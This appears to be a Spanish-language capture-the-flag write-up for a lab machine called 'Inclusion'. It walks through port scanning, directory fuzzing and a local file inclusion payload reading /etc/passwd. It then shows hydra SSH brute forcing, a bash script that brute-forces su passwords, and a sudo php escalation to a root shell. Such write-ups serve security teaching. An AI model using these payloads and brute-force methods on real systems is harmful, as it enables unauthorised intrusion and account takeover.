---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Inclusion

Empezamos haciendo un `nmap` a la máquina con el parámetro `-p-` para que recorra todos los puertos.

```bash
cat nmap
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 17:50 EDT
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
```

Seguidamente, procedo a listar los directorios del servicio web, ya que al acceder a `http://172.17.0.2/` me sale el fichero de configuración de Apache.

```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ
```

```bash
shop                [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
```

Si accedemos a la página web, encontramos esto:

<figure><img src="../../.gitbook/assets/Pasted image 20250714010243.png" alt=""><figcaption></figcaption></figure>

En la esquina inferior izquierda, se puede observar un error de código php: está intentando obtener el parámetro "archivo", pero no lo encuentra. Esto nos da una pista de que la web utiliza dicho parámetro que, probablemente, utiliza para listar ficheros. Si probamos a poner la url `172.17.0.2/shop/?archivo=../../../../../etc/passwd`, vemos que es vulnerable a LFI:

<figure><img src="../../.gitbook/assets/Pasted image 20250714010651 (1).png" alt=""><figcaption></figcaption></figure>

Entre los usuarios listados en el `/etc/passwd`, encontramos `manchi` y `seller` que tienen tanto un home en `/home` definido, como un `/bin/bash`. Probamos a hacer fuerza bruta al usuario `manchi` con `hydra`:

```bash
hydra -l manchi -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

{% code fullWidth="false" %}
```
[22][ssh] host: 172.17.0.2   login: manchi   password: lovely
1 of 1 target successfully completed, 1 valid password found
```
{% endcode %}

Con esto ganamos acceso al usuario `manchi` por `ssh`. Una vez dentro, nos damos cuenta de que el usuario no es `sudoer`, ni tampoco hay binarios con bit SUID. Probamos a entrar al otro usuario usando `hydra` nuevamente, pero vemos que por alguna razón está rechazando las conexiones, por lo que puede tener bloqueadas las conexiones por `ssh`. El siguiente paso es probar a hacer fuerza bruta a través de `su` al usuario `seller` desde dentro de la máquina. Nos pasamos por `scp` el `rockyou.txt` a la máquina y tiramos el siguiente script en `bash`:

```bash
#!/bin/bash

# Función que se ejecutará en caso de que el usuario no proporcione 2 argumentos.
mostrar_ayuda() {
    echo -e "\e[1;33mUso: $0 USUARIO DICCIONARIO"
    echo -e "\e[1;31mSe deben especificar tanto el nombre de usuario como el archivo de diccionario.\e[0m"
    exit 1
}

# Llamamos a esta función desde el trap finalizar SIGINT (En caso de que el usuario presione control + c para salir)
finalizar() {
    echo -e "\e[1;31m\nFinalizando el script\e[0m"
    exit
}

trap finalizar SIGINT

usuario=$1
diccionario=$2

# Variable especial $# para comprobar el número de parámetros introducido. En caso de no ser 2, se imprimen las instrucciones.
if [[ $# != 2 ]]; then
    mostrar_ayuda
fi

# Bucle while que lee línea a línea el contenido de la variable $diccionario, que a su vez esta variable recibe el diccionario como parámetro.
while IFS= read -r password; do
    echo "Probando contraseña: $password"
    if timeout 0.1 bash -c "echo '$password' | su $usuario -c 'echo Hello'" > /dev/null 2>&1; then
        clear
        echo -e "\e[1;32mContraseña encontrada para el usuario $usuario: $password\e[0m"
        break
    fi
done < "$diccionario"
```

Después de ejecutar el script, obtenemos la contraseña de `seller`:

```
Contraseña encontrada para el usuario seller: qwerty
```

Con `su` accedemos al usuario. Vemos qué permisos tenemos con `sudo`:

```bash
sudo -l
```

```
Matching Defaults entries for seller on 9c6760c93936:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User seller may run the following commands on 9c6760c93936:
    (ALL) NOPASSWD: /usr/bin/php
```

Vemos que podemos hacer `sudo` al binario `/usr/bin/php` sin necesidad de contraseña. Buscando en [gtfobins](https://gtfobins.github.io/), vemos que podemos escalar privilegios si tenemos permisos para ejecutarlo con `sudo`:

```bash
CMD="/bin/sh"
sudo php -r "system('$CMD');"
```

Una vez ejecutado el código `php` con `sudo`, obtenemos acceso al root de la máquina:

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250714013436.png" alt=""><figcaption></figcaption></figure></div>
